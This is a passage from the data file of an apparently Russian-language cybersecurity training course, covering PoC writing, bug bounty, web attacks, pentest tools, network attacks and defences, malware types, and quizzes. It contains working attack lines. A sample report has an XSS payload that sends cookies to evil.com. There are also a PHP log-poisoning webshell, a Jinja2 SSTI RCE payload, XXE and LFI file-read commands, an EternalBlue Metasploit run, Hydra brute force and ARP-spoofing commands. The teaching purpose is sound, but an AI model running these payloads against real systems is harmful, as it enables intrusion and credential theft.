- **E**levation of privilege — повышение привилегий

**Fuzzing**
Автоматическая генерация случайных/граничных данных на вход программы. Цель — вызвать краш (= потенциальная уязвимость).

Инструменты: AFL++, libFuzzer, Boofuzz (сетевые протоколы).

**Code Review**
Лучший метод для глубоких уязвимостей. Ищи:
- Небезопасные функции (strcpy, gets, sprintf в C)
- Проверку аргументов после их использования
- Целочисленные переполнения
- Race conditions`,
        codeExample: `# AFL++ — coverage-guided fuzzer
afl-fuzz -i input_corpus -o findings -- ./target_binary @@

# libFuzzer (для C/C++ программ)
# target_fuzz.cpp:
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    parse_input(data, size);  // функция которую фаззим
    return 0;
}
clang -fsanitize=fuzzer,address target_fuzz.cpp -o fuzzer
./fuzzer -max_total_time=3600`
      },
      {
        id: 'sec-3-2',
        title: 'Разработка Proof of Concept',
        keyPoints: [
          'PoC доказывает реальную эксплуатируемость уязвимости',
          'Надёжный PoC = максимальный выплата за баг',
          'Для бинарных уязвимостей: exploit = контроль RIP/EIP + payload',
          'Из твоего опыта: PoC в Foundry = PoC для бинарных уязвимостей'
        ],
        content: `**Зачем нужен PoC?**
Найти уязвимость — полдела. Нужно доказать, что она реально эксплуатируется. PoC (Proof of Concept) — это минимальный рабочий эксплойт.

В bug bounty: без PoC репорт получает низкий приоритет. С PoC — максимальный.

**Твои навыки из Code4rena**
В Foundry ты пишешь тесты вида:
\`\`\`solidity
function testExploit() public {
    // Setup
    vm.deal(attacker, 100 ether);
    // Attack
    Exploit exploit = new Exploit(address(target));
    exploit.run();
    // Assert profit
    assertGt(attacker.balance, 1000 ether);
}
\`\`\`
Структура **идентична** классическому security PoC:
1. Setup — подготовка окружения
2. Trigger — эксплуатация
3. Assert — доказательство импакта

**PoC для веб-уязвимости**
\`\`\`
1. Минимальный HTTP-запрос, воспроизводящий баг
2. Скриншот / видео доказательство
3. Описание импакта (что реально можно сделать)
\`\`\`

**Quality PoC checklist:**
✅ Воспроизводится с первого раза
✅ Минимальный — без лишнего кода
✅ Чёткий impact statement
✅ Tested on latest version`,
        codeExample: `# Пример структуры PoC репорта для веб-уязвимости

## Title
Stored XSS in /profile/bio — cookie theft possible

## Steps to reproduce
1. Login as any user
2. Navigate to /settings/profile
3. In "Bio" field, enter: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
4. Save profile
5. Open profile page in another browser / incognito
6. Observe request to evil.com with victim's session cookie

## Impact
Attacker can steal session tokens of ALL users who view the profile.
Full account takeover possible.

## CVSS: 8.8 (High)
AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`
      },
      {
        id: 'sec-3-3',
        title: 'Bug Bounty и ответственное раскрытие',
        keyPoints: [
          'Bug Bounty: HackerOne, Bugcrowd, Intigriti — топ-платформы',
          'Responsible Disclosure: уведомить вендора до публичного раскрытия',
          'CVD (Coordinated Vulnerability Disclosure) — стандарт ISO 29147',
          'Касперский: bug bounty программа + own research team'
        ],
        content: `**Bug Bounty — монетизация навыков**
Компании платят за найденные уязвимости. Топ выплаты:
- Google: до $31 000 за Chrome RCE
- Microsoft: до $250 000 за Hyper-V RCE
- HackerOne Hall of Fame — репутация в сообществе

**Как начать?**
1. Зарегистрируйся на HackerOne / Bugcrowd
2. Ищи программы с broad scope (wildcard *.target.com)
3. Начни с простых: IDOR, информационное раскрытие
4. Постепенно переходи к сложным

**Responsible Disclosure (Ответственное раскрытие)**
Это этический стандарт:
1. Найди уязвимость
2. Уведоми вендора (security@company.com)
3. Дай разумное время на исправление (90 дней — стандарт Google Project Zero)
4. Только после патча — публикуй

**Почему это важно для Касперского**
Каспер активно изучает уязвимости и публикует исследования (GReAT team). Навык ответственного раскрытия = понимание процессов координации между командами.

**Full Disclosure vs Responsible Disclosure**
Full Disclosure — публикация сразу, без уведомления вендора. Спорно этически, но иногда применяется если вендор игнорирует проблему дольше 90 дней.`,
        codeExample: `# Шаблон письма вендору (responsible disclosure)

Subject: [Security] Stored XSS Vulnerability in User Profiles

Hello Security Team,

I've discovered a Stored XSS vulnerability in your application
that allows an attacker to steal session cookies of any user.

Affected endpoint: POST /api/profile/update
Parameter: bio
Severity: High (CVSS 8.8)

Proof of Concept: [PoC attached / described below]

I'm following responsible disclosure and will keep this
confidential for 90 days from the date of this report.

Best regards,
[Your Name]`
      },
      {
        id: 'sec-3-4',
        title: 'Продвинутые веб-атаки: LFI, XXE, SSTI',
        keyPoints: [
          'LFI (Local File Inclusion) — чтение произвольных файлов через параметр пути',
          'XXE (XML External Entity) — чтение файлов/SSRF через уязвимый XML-парсер',
          'SSTI (Server-Side Template Injection) — выполнение кода через шаблонизатор',
          'RCE — удалённое выполнение команд — наивысший критерий'
        ],
        content: `**LFI (Local File Inclusion)**
Когда приложение включает файл по пользовательскому пути без валидации.

\`?page=about\` → включает about.php
\`?page=../../etc/passwd\` → читает /etc/passwd → LFI

**Что читать через LFI:**
- \`/etc/passwd\` — список пользователей
- \`/etc/shadow\` — хэши паролей (требует root)
- \`/proc/self/environ\` — переменные окружения
- \`/var/log/apache2/access.log\` → Log Poisoning → RCE!

**Log Poisoning → RCE**
Запрос с PHP-кодом в User-Agent: \`User-Agent: <?php system($_GET['cmd']); ?>\`
Код попадает в логи. Затем \`?page=../../../../var/log/apache2/access.log&cmd=id\` → выполнение команды.

**XXE (XML External Entity)**
XML-парсеры поддерживают "внешние сущности" — ссылки на файлы или URL.
\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
\`\`\`
Если сервер возвращает значение XXE — читаем любые файлы. XXE → SSRF: \`SYSTEM "http://169.254.169.254/..."\`

**SSTI (Server-Side Template Injection)**
Шаблонизаторы (Jinja2, Twig, Freemarker) вычисляют выражения. Если ввод попадает в шаблон без эскейпинга:

\`?name={{7*7}}\` → ответ \`49\` → Jinja2 SSTI подтверждён!

Jinja2 RCE: \`{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}\`

**Как находить:**
- LFI: параметры page, file, include, template, path
- XXE: endpoints принимающие XML (Content-Type: application/xml)
- SSTI: поля ввода, которые отражаются в ответе — тест \`{{7*7}}\`, \`${7*7}\`, \`<%= 7*7 %>\``,
        codeExample: `# LFI — базовая проверка
curl "https://target.com/page?file=../../etc/passwd"
curl "https://target.com/page?file=../../../../etc/shadow"
# PHP wrapper: base64 encoding исходников
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"

# XXE payload
cat > xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
EOF
curl -X POST https://target.com/api/import \
  -H "Content-Type: application/xml" \
  -d @xxe.xml

# SSTI probe — тест всех популярных шаблонизаторов
# Jinja2: {{7*'7'}} → 7777777 (Python)
# Twig:   {{7*'7'}} → 49 (PHP)
# Freemarker: ${7*7} → 49 (Java)`
      },
      {
        id: 'sec-3-5',
        title: 'Инструменты пентестера',
        keyPoints: [
          'Burp Suite — главный инструмент веб-пентеста: Proxy, Repeater, Intruder, Scanner',
          'Metasploit — фреймворк для эксплуатации: поиск, настройка, запуск модулей',
          'Nikto, Gobuster, ffuf — сканирование и перебор',
          'Hydra, Medusa — брутфорс аутентификации'
        ],
        content: `**Burp Suite — центральный инструмент**
Burp — HTTP-прокси с богатым функционалом. Стандарт для веб-пентестеров.

**Ключевые компоненты:**
- **Proxy** — перехватывает каждый запрос, можно изменять на лету
- **Repeater** — повторно отправлять изменённые запросы, изучать ответы
- **Intruder** — автоматический перебор (fuzzing параметров, brute force)
- **Scanner** (Pro) — автоматическое обнаружение уязвимостей
- **Decoder** — base64/URL/HTML encode/decode
- **Comparer** — сравнение двух ответов (полезно для blind SQLi, timing атак)

**Metasploit Framework**
Фреймворк с тысячами модулей для эксплуатации известных CVE.

\`\`\`
msfconsole
search ms17-010          # поиск EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
run
\`\`\`

Meterpreter — продвинутый шелл: upload/download файлов, скриншоты, keylogger, pivoting.

**Разведка и сканирование:**
- **Gobuster/ffuf** — брутфорс директорий и файлов
- **Nikto** — сканер конфигурации (открытые директории, дефолтные файлы)
- **WhatWeb** — определение CMS/технологий
- **wappalyzer** — расширение браузера для fingerprinting

**Брутфорс:**
- **Hydra** — SSH, FTP, HTTP, RDP, MySQL и др.
- **Medusa** — аналог, параллельный
- **Wordlists** — rockyou.txt (14M паролей), SecLists от Daniel Miessler`,
        codeExample: `# ffuf — быстрый web fuzzer
# Поиск директорий
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/big.txt

# Поиск параметров
ffuf -u "https://target.com/api?FUZZ=test" -w params.txt -fs 1337

# Gobuster
gobuster dir -u https://target.com -w common.txt -x php,txt,html

# Hydra — брутфорс SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
# HTTP форма
hydra -l admin -P passwords.txt 192.168.1.100 \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Metasploit — проверка без root (auxiliary)
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.1.0/24; run"`
      }
    ],
    quiz: [
      {
        id: 'q3-1',
        question: 'Что такое White Box тестирование?',
        options: [
          'Тестирование без авторизации в приложении',
          'Тестирование с полным доступом к исходному коду и архитектуре',
          'Тестирование только интерфейса без доступа к API',
          'Автоматизированное сканирование с помощью инструментов'
        ],
        correctIndex: 1,
        explanation:
          'White box даёт максимальный контекст: исходный код, схемы БД, конфигурации. Code4rena аудиты — это white box. Именно этот подход Касперский использует в своих deep-dive исследованиях.',
        difficulty: 'easy'
      },
      {
        id: 'q3-2',
        question: 'Что означает буква "T" в модели STRIDE?',
        options: ['Trust', 'Tampering', 'Tracing', 'Tunneling'],
        correctIndex: 1,
        explanation:
          'STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Tampering — модификация данных без авторизации.',
        difficulty: 'medium'
      },
      {
        id: 'q3-3',
        question: 'Стандартный срок ответственного раскрытия (согласно Google Project Zero) — это:',
        options: ['30 дней', '60 дней', '90 дней', '180 дней'],
        correctIndex: 2,
        explanation:
          'Google Project Zero установил стандарт в 90 дней. После 90 дней без патча — уязвимость публикуется. Это создаёт давление на вендоров и является компромиссом между публичной безопасностью и временем на исправление.',
        difficulty: 'easy'
      },
      {
        id: 'q3-4',
        question: 'Fuzzing — это:',
        options: [
          'Ручной анализ исходного кода на наличие уязвимостей',
          'Атака методом перебора паролей',
          'Автоматическая генерация случайных входных данных для поиска сбоев',
          'Анализ сетевого трафика с помощью Wireshark'
        ],
        correctIndex: 2,
        explanation:
          'Fuzzing отправляет программе случайные, некорректные или граничные данные и ищет краши. Краш = потенциальная уязвимость (buffer overflow, use-after-free, etc). AFL++ и libFuzzer — ведущие инструменты.',
        difficulty: 'medium'
      },
      {
        id: 'q3-5',
        question: 'Чем твой PoC в Foundry (testExploit) похож на PoC для классической уязвимости?',
        options: [
          'Ничем — это принципиально разные концепции',
          'Только тем что оба используют assert',
          'Структурой: setup окружения → триггер атаки → доказательство импакта',
          'Только языком программирования — оба используют C'
        ],
        correctIndex: 2,
        explanation:
          'Структура любого PoC универсальна: настройка окружения, выполнение атаки, верификация результата. Твои Foundry-тесты — это уже security PoC, просто в контексте EVM. Этот навык переносится напрямую.',
        difficulty: 'medium'
      },
      {
        id: 'q3-6',
        question: 'LFI (Local File Inclusion) через Log Poisoning позволяет:',
        options: [
          'Только читать лог-файлы',
          'Внедрить PHP-код в логи через User-Agent, затем включить лог → RCE',
          'Удалить лог-файлы с сервера',
          'Только перечислить файлы в директории'
        ],
        correctIndex: 1,
        explanation: 'Если LFI позволяет включить файл логов, и мы контролируем User-Agent (который записывается в лог), можно записать <?php system($_GET["cmd"]); ?> в лог. Затем включить log через LFI → PHP выполнит код → RCE. Классическая техника эскалации LFI → RCE.',
        difficulty: 'hard'
      },
      {
        id: 'q3-7',
        question: 'SSTI (Server-Side Template Injection) подтверждается, когда:',
        options: [
          'Приложение возвращает 500 ошибку',
          'Ввод {{7*7}} возвращается в ответе как 49',
          'SQL-запрос выполняется с ошибкой',
          'Cookie содержит base64 данные'
        ],
        correctIndex: 1,
        explanation: '{{7*7}} → 49 означает, что шаблонизатор вычислил выражение. Jinja2 (Python): {{7*\'7\'}} = 7777777. Twig (PHP): {{7*\'7\'}} = 49. Различные результаты помогают идентифицировать движок. Дальше — поиск цепочки для RCE через объекты Python/PHP.',
        difficulty: 'hard'
      },
      {
        id: 'q3-8',
        question: 'Какой компонент Burp Suite используется для автоматического перебора параметров?',
        options: ['Proxy', 'Decoder', 'Intruder', 'Comparer'],
        correctIndex: 2,
        explanation: 'Burp Intruder автоматически подставляет значения из списка в помеченные позиции запроса. Используется для: brute force, fuzzing параметров, перебора IDOR-идентификаторов, поиска скрытых параметров. В Community Edition ограничен по скорости.',
        difficulty: 'easy'
      }
    ]
  },

  // ── MODULE 4 ────────────────────────────────────────────────────────────
  {
    id: 'mod-04',
    title: 'Сетевая безопасность',
    subtitle: 'Network Security',
    description:
      'TCP/IP стек, анализ трафика, атаки на сетевом уровне. Wireshark, Nmap, Scapy.',
    icon: '📡',
    color: '#880018',
    xpReward: 280,
    estimatedTime: '~50 мин',
    prerequisites: ['mod-02'],
    tags: ['network', 'TCP/IP', 'Wireshark', 'scanning'],
    theory: [
      {
        id: 'sec-4-1',
        title: 'Модель OSI и стек TCP/IP',
        keyPoints: [
          'OSI: 7 уровней от Physical до Application — каждый уровень изолирован',
          'TCP/IP: 4 уровня — Network Access, Internet, Transport, Application',
          'Three-way handshake TCP: SYN → SYN-ACK → ACK',
          'IP-адресация: IPv4 (32 бит), маски подсетей, CIDR нотация'
        ],
        content: `**Модель OSI — почему это важно**
Атаки происходят на конкретных уровнях. Понимание OSI — это язык, на котором говорят все специалисты ИБ.

| Уровень | Название | Протоколы | Атаки |
|---------|----------|-----------|-------|
| L7 | Application | HTTP, DNS, SMTP | SQLi, XSS, DNS spoofing |
| L6 | Presentation | TLS, SSL | SSL stripping |
| L5 | Session | NetBIOS, RPC | Session hijacking |
| L4 | Transport | TCP, UDP | SYN flood, port scan |
| L3 | Network | IP, ICMP, ARP | IP spoofing, ICMP flood |
| L2 | Data Link | Ethernet, MAC | ARP poisoning, MAC flood |
| L1 | Physical | Кабели, WiFi | Физический перехват |

**TCP Three-way Handshake**
Перед передачей данных TCP устанавливает соединение:
1. Клиент отправляет **SYN** (хочу соединиться, мой seq=100)
2. Сервер отвечает **SYN-ACK** (принял, мой seq=200, жду ACK)
3. Клиент отправляет **ACK** (подтверждаю)

**SYN Flood** — атакующий шлёт тысячи SYN без завершения handshake, заполняя очередь сервера.

**IP-адресация и подсети**
- IPv4: 4 байта, например 192.168.1.1
- CIDR: /24 = маска 255.255.255.0 = 254 хоста
- /16 = 65534 хоста, /32 = один хост
- Приватные: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16

**UDP vs TCP**
TCP — надёжный, с подтверждением доставки. UDP — быстрый, без гарантий. DNS, VoIP, игры — UDP. HTTP, SSH, FTP — TCP.`,
        codeExample: `# Просмотр активных соединений
netstat -tulnp        # Linux
ss -tulnp             # современный аналог

# Трассировка маршрута до хоста
traceroute 8.8.8.8   # Linux
tracert 8.8.8.8      # Windows

# Проверка ARP-таблицы (L2 → L3 маппинг)
arp -a

# Захват пакетов tcpdump
tcpdump -i eth0 -n 'tcp port 80' -w capture.pcap`
      },
      {
        id: 'sec-4-2',
        title: 'Nmap — разведка и сканирование',
        keyPoints: [
          'Host discovery: -sn (ping sweep) без сканирования портов',
          'SYN scan (-sS) — стелс, не завершает соединение',
          '-sV — определение версий сервисов, -O — определение ОС',
          'NSE (Nmap Scripting Engine) — скрипты для автоматизации'
        ],
        content: `**Nmap — стандартный инструмент сетевой разведки**
Nmap используется как атакующими, так и защитниками для аудита сети. Знание Nmap — базовое требование для любой роли в ИБ.

**Типы сканирования**

🔴 **SYN scan** (-sS) — "стелс-сканирование". Отправляет SYN, получает SYN-ACK (порт открыт) или RST (закрыт). Не завершает соединение — меньше логов.

🔶 **TCP Connect** (-sT) — полное соединение. Не требует root, но шумнее. Видно в логах как успешное соединение.

🔵 **UDP scan** (-sU) — медленно, но необходимо. UDP-сервисы: DNS (53), SNMP (161), DHCP (67/68).

**Определение сервисов и ОС**
\`-sV\` — определяет версию сервиса: Apache 2.4.41, OpenSSH 8.2. Версия → поиск CVE для конкретной версии.
\`-O\` — OS fingerprinting по TTL, window size и другим TCP/IP характеристикам.

**NSE — Nmap Scripting Engine**
Скрипты Lua для автоматизации. Категории:
- \`default\` — безопасные базовые проверки
- \`vuln\` — поиск уязвимостей
- \`brute\` — брутфорс
- \`exploit\` — эксплуатация (осторожно!)

**Timing (-T0 до -T5)**
-T0 (paranoid) — очень медленно. -T3 (normal) — дефолт. -T5 (insane) — быстро, шумно.`,
        codeExample: `# Быстрый ping sweep (без сканирования портов)
nmap -sn 192.168.1.0/24

# SYN scan топ-1000 портов с версиями
sudo nmap -sS -sV -O 192.168.1.100

# Полное сканирование всех 65535 портов
sudo nmap -sS -p- 192.168.1.100 -T4

# NSE: поиск уязвимостей
nmap --script vuln 192.168.1.100

# Конкретные скрипты
nmap --script smb-vuln-ms17-010 192.168.1.0/24

# Сохранение результатов
nmap -oX scan.xml -oN scan.txt 192.168.1.0/24`
      },
      {
        id: 'sec-4-3',
        title: 'Wireshark — анализ трафика',
        keyPoints: [
          'Capture filter — фильтрует до захвата (BPF синтаксис)',
          'Display filter — фильтрует уже захваченное (синтаксис Wireshark)',
          'Follow TCP Stream — восстанавливает всю сессию',
          'Statistics → Protocol Hierarchy — обзор трафика'
        ],
        content: `**Wireshark — анализатор пакетов №1**
Wireshark перехватывает и анализирует сетевой трафик. Незаменим для: отладки протоколов, поиска аномалий, forensics, изучения атак.

**Capture vs Display фильтры**

**Capture filters** (синтаксис BPF) — применяются до захвата, уменьшают объём:
- \`port 80\` — только порт 80
- \`host 192.168.1.1\` — трафик от/к IP
- \`tcp\` — только TCP

**Display filters** (синтаксис Wireshark) — фильтруют уже захваченное:
- \`http.request.method == "POST"\`
- \`dns.qry.name contains "evil"\`
- \`tcp.flags.syn == 1 && tcp.flags.ack == 0\` → все SYN пакеты (сканирование!)

**Обнаружение атак**

🔴 **SYN scan** — много SYN без ACK от одного IP. Фильтр: \`tcp.flags.syn==1 && tcp.flags.ack==0\`

🔴 **ARP spoofing** — один MAC претендует на несколько IP. Statistics → ARP → дублирующиеся IP.

🔴 **DNS tunneling** — аномально длинные DNS-запросы, необычные TXT-записи.

🔴 **Cleartext credentials** — HTTP Basic Auth, FTP, Telnet в открытом виде.

**Follow TCP/UDP Stream**
Правая кнопка на пакет → Follow → TCP Stream. Видишь всю сессию — запросы, ответы, данные.

**Export Objects**
File → Export Objects → HTTP. Извлечь файлы, передаваемые по HTTP — картинки, документы, скрипты.`,
        codeExample: `# tcpdump — Wireshark в командной строке
tcpdump -i eth0 -A 'port 80'          # HTTP трафик в ASCII
tcpdump -i eth0 -w dump.pcap          # запись в файл
tcpdump -r dump.pcap 'dns'            # чтение файла

# Полезные Wireshark display-фильтры:
# http.request — все HTTP запросы
# ftp-data — FTP файлы
# smtp contains "password" — слово password в SMTP
# ip.src == 10.0.0.5 && tcp.dstport == 443

# tshark (CLI версия Wireshark)
tshark -r capture.pcap -Y 'http.request' -T fields -e ip.src -e http.host`
      },
      {
        id: 'sec-4-4',
        title: 'Сетевые атаки: ARP, MITM, DNS',
        keyPoints: [
          'ARP spoofing — подмена MAC в ARP-таблице соседей',
          'MITM позволяет перехватывать и модифицировать трафик',
          'DNS spoofing — подмена ответов DNS для перенаправления',
          'SSL stripping — понижение HTTPS до HTTP'
        ],
        content: `**ARP Spoofing / ARP Poisoning**
ARP (Address Resolution Protocol) — L2 протокол для маппинга IP→MAC. Он не имеет аутентификации.

Атакующий отправляет ложные ARP-ответы:
- Говорит роутеру: "IP жертвы — это мой MAC"
- Говорит жертве: "IP роутера — это мой MAC"
Результат: весь трафик идёт через атакующего → MITM.

**Man-in-the-Middle (MITM)**
После ARP spoofing атакующий находится между жертвой и роутером.
Может: перехватывать пароли (cleartext), читать cookie, модифицировать ответы.

**Инструменты:**
- **Bettercap** — современный MITM фреймворк (ARP, DNS, HTTP, HTTPS)
- **ettercap** — классика, ARP poisoning + сниффинг
- **arpspoof** (dsniff) — базовая ARP-атака

**DNS Spoofing**
Подмена DNS-ответов: домен bank.com → IP атакующего → фишинговая страница.
Вектор: MITM после ARP spoofing, или компрометация DNS-сервера.

**SSL Stripping**
Инструмент **sslstrip**: перехватывает HTTPS-редиректы и заменяет их HTTP.
Жертва думает, что соединение защищено — но нет.

**Защита:**
- Dynamic ARP Inspection (DAI) на управляемых коммутаторах
- DNSSEC — цифровые подписи DNS-записей
- HSTS (HTTP Strict Transport Security) — браузер требует HTTPS
- Сегментация сети, VLAN`,
        codeExample: `# Bettercap — современный MITM фреймворк
sudo bettercap -iface eth0

# В интерактивной консоли bettercap:
# net.probe on              — обнаружение хостов
# net.show                  — список хостов
# set arp.spoof.targets 192.168.1.5
# arp.spoof on              — начало ARP spoofing
# net.sniff on              — перехват трафика

# Базовый arpspoof (две команды в разных терминалах)
arpspoof -i eth0 -t 192.168.1.5 192.168.1.1   # жертве: я роутер
arpspoof -i eth0 -t 192.168.1.1 192.168.1.5   # роутеру: я жертва

# Обнаружение ARP spoofing
arp -a   # ищи дублирующиеся MAC-адреса`
      },
      {
        id: 'sec-4-5',
        title: 'Firewall, IDS/IPS и защита сети',
        keyPoints: [
          'Firewall фильтрует по правилам (IP, порт, протокол, состояние)',
          'IDS (Intrusion Detection) — обнаруживает, не блокирует',
          'IPS (Intrusion Prevention) — обнаруживает и блокирует',
          'Snort/Suricata — открытые IDS/IPS с языком правил'
        ],
        content: `**Типы межсетевых экранов**

🔷 **Stateless (пакетный фильтр)** — проверяет каждый пакет независимо: src/dst IP, порт, протокол. Быстрый, но примитивный. Пример: iptables без conntrack.

🔷 **Stateful** — отслеживает состояние TCP-сессий. Знает, что ответный пакет должен соответствовать установленному соединению.

🔷 **NGFW (Next-Gen Firewall)** — DPI (Deep Packet Inspection), приложение-ориентированные правила, SSL инспекция, IPS. Palo Alto, Fortinet, Check Point.

**iptables — Linux Firewall**
Цепочки: INPUT (входящий), OUTPUT (исходящий), FORWARD (транзитный).
Таблицы: filter (основная), nat (NAT/маскарадинг), mangle (модификация).

**IDS vs IPS**
- **IDS** (Intrusion Detection System) — пассивный мониторинг. Обнаруживает и алертит. Snort, Suricata, Zeek.
- **IPS** (Intrusion Prevention System) — inline, блокирует вредоносный трафик в реальном времени. Snort/Suricata в IPS-режиме.

**Snort — правила**
Snort-правило: \`action protocol src_ip src_port direction dst_ip dst_port (options)\`

**Уклонение от IDS/IPS:**
- Фрагментация пакетов
- Медленное сканирование (-T1)
- Шифрование трафика (HTTPS, TLS)
- Полиморфные payload'ы

**VLAN сегментация**
Разделение сети на изолированные сегменты (DMZ, внутренняя, серверная). Если один сегмент скомпрометирован — lateral movement ограничен.`,
        codeExample: `# iptables — базовые правила
iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # разрешить SSH
iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # разрешить HTTP
iptables -A INPUT -j DROP                        # блокировать всё остальное

# Просмотр правил
iptables -L -v -n --line-numbers

# Snort — запуск в IDS-режиме
snort -A console -i eth0 -c /etc/snort/snort.conf

# Пример Snort-правила: обнаружение Nmap SYN scan
alert tcp any any -> $HOME_NET any (flags:S; msg:"NMAP SYN Scan"; threshold:type both,track by_src,count 20,seconds 1; sid:1000001;)

# nftables (современная замена iptables)
nft add rule inet filter input tcp dport 22 accept`
      }
    ],
    quiz: [
      {
        id: 'q4-1',
        question: 'На каком уровне OSI работает ARP?',
        options: ['L3 — Network', 'L2 — Data Link', 'L4 — Transport', 'L7 — Application'],
        correctIndex: 1,
        explanation: 'ARP работает на L2 (Data Link), маппируя L3-адреса (IP) на L2-адреса (MAC). Именно отсутствие аутентификации на L2 делает ARP spoofing возможным.',
        difficulty: 'medium'
      },
      {
        id: 'q4-2',
        question: 'Чем Nmap SYN scan (-sS) отличается от TCP Connect scan (-sT)?',
        options: [
          '-sS требует root, не завершает соединение, оставляет меньше следов',
          '-sS работает только на Windows, -sT на Linux',
          '-sT быстрее, чем -sS',
          'Нет разницы, оба дают одинаковый результат'
        ],
        correctIndex: 0,
        explanation: 'SYN scan отправляет SYN и получает ответ, но не завершает handshake RST-пакетом. Требует root для создания raw sockets. В логах приложений не появляется как успешное соединение.',
        difficulty: 'medium'
      },
      {
        id: 'q4-3',
        question: 'Какой Wireshark фильтр покажет все попытки SYN-сканирования?',
        options: [
          'tcp.port == 80',
          'tcp.flags.syn == 1 && tcp.flags.ack == 0',
          'http.request',
          'ip.proto == 6'
        ],
        correctIndex: 1,
        explanation: 'SYN-пакеты без ACK — признак сканирования или SYN flood. Много таких пакетов с одного IP, направленных на разные порты — классический Nmap SYN scan.',
        difficulty: 'hard'
      },
      {
        id: 'q4-4',
        question: 'Что такое MITM атака?',
        options: [
          'Многоуровневое сканирование портов',
          'Атакующий располагается между жертвой и сервером, перехватывая трафик',
          'Атака на DNS-сервер через UDP',
          'Брутфорс пароля к Wi-Fi сети'
        ],
        correctIndex: 1,
        explanation: 'Man-in-the-Middle: атакующий встраивается в соединение и может читать/изменять трафик. Реализуется через ARP spoofing (LAN), Evil Twin (Wi-Fi), BGP hijacking (интернет-маршрутизация).',
        difficulty: 'easy'
      },
      {
        id: 'q4-5',
        question: 'Какой адрес используется для SSRF-атаки на metadata-сервис в AWS?',
        options: ['127.0.0.1', '10.0.0.1', '169.254.169.254', '192.168.0.1'],
        correctIndex: 2,
        explanation: '169.254.169.254 — link-local адрес IMDS (Instance Metadata Service) в AWS/GCP/Azure. Через SSRF к этому адресу можно получить IAM credentials, user-data и другую чувствительную информацию.',
        difficulty: 'medium'
      },
      {
        id: 'q4-6',
        question: 'IDS отличается от IPS тем, что:',
        options: [
          'IDS работает только в сети, IPS — только на хосте',
          'IDS только обнаруживает и алертит, IPS активно блокирует трафик',
          'IPS использует сигнатуры, IDS — только аномалии',
          'IDS быстрее чем IPS'
        ],
        correctIndex: 1,
        explanation: 'IDS (Intrusion Detection System) — пассивный: анализирует копию трафика, оповещает. IPS (Intrusion Prevention System) — активный: стоит inline, может дропать пакеты. Snort может работать в обоих режимах.',
        difficulty: 'easy'
      },
      {
        id: 'q4-7',
        question: 'TCP Three-way handshake: в каком порядке идут флаги?',
        options: ['ACK → SYN → SYN-ACK', 'SYN → SYN-ACK → ACK', 'SYN-ACK → SYN → FIN', 'RST → SYN → ACK'],
        correctIndex: 1,
        explanation: 'Клиент шлёт SYN (хочу соединиться), сервер отвечает SYN-ACK (принял, готов), клиент подтверждает ACK. После этого данные можно передавать. SYN flood атакует именно этот механизм.',
        difficulty: 'easy'
      },
      {
        id: 'q4-8',
        question: 'Что такое SSL Stripping?',
        options: [
          'Удаление SSL-сертификата с сервера',
          'Атака, понижающая HTTPS соединение до HTTP без ведома пользователя',
          'Брутфорс приватного ключа SSL',
          'Подмена SSL-сертификата поддельным'
        ],
        correctIndex: 1,
        explanation: 'SSL stripping перехватывает HTTP-редиректы на HTTPS и подменяет их HTTP. Пользователь думает, что всё нормально (видит HTTP), атакующий видит трафик в открытом виде. HSTS защищает от этой атаки.',
        difficulty: 'medium'
      }
    ]
  },

  // ── MODULE 5 ────────────────────────────────────────────────────────────
  {
    id: 'mod-05',
    title: 'Анализ малвари',
    subtitle: 'Malware Analysis',
    description:
      'Статический и динамический анализ вредоносного ПО. PE-формат, IDA/Ghidra, поведенческий анализ.',
    icon: '🦠',
    color: '#660012',
    xpReward: 400,
    estimatedTime: '~90 мин',
    prerequisites: ['mod-04'],
    tags: ['malware', 'reverse', 'IDA', 'sandbox'],
    theory: [
      {
        id: 'sec-5-1',
        title: 'Классификация вредоносного ПО',
        keyPoints: [
          'Вирус — прикрепляется к легитимным файлам и распространяется с ними',
          'Троян — маскируется под легитимное ПО, открывает backdoor',
          'RAT (Remote Access Trojan) — полный удалённый контроль над системой',
          'Ransomware — шифрует файлы, требует выкуп в криптовалюте'
        ],
        content: `**Таксономия малвари — обязательное знание для аналитика**

| Тип | Механизм | Примеры |
|-----|----------|---------|
| Вирус | Заражает файлы, самовоспроизводится | ILOVEYOU, CIH |
| Червь | Распространяется без участия пользователя | WannaCry, Slammer |
| Троян | Выглядит как полезная программа | ZeuS, Emotet |
| RAT | Удалённый контроль | DarkComet, Cobalt Strike |
| Руткит | Скрывает присутствие в системе | Necurs, TDL4 |
| Bootkit | Заражает MBR/UEFI | Mebroot, LoJax |
| Ransomware | Шифрование + вымогательство | WannaCry, REvil |
| Spyware | Кража данных | Pegasus, FinFisher |
| Adware | Навязчивая реклама | — |
| Wiper | Уничтожение данных | NotPetya, Shamoon |

**Ransomware — глубже**
Механизм работы современного ransomware:
1. **Получение доступа** — фишинг, эксплойт, brute force RDP
2. **Lateral movement** — распространение по сети (Mimikatz, PsExec)
3. **Exfiltration** — кража данных перед шифрованием (двойное вымогательство)
4. **Шифрование** — гибридная схема: симметричный ключ (AES) + RSA-публичный ключ
5. **Ransom note** — требование оплаты в Monero/Bitcoin

**APT-цепочка атаки**
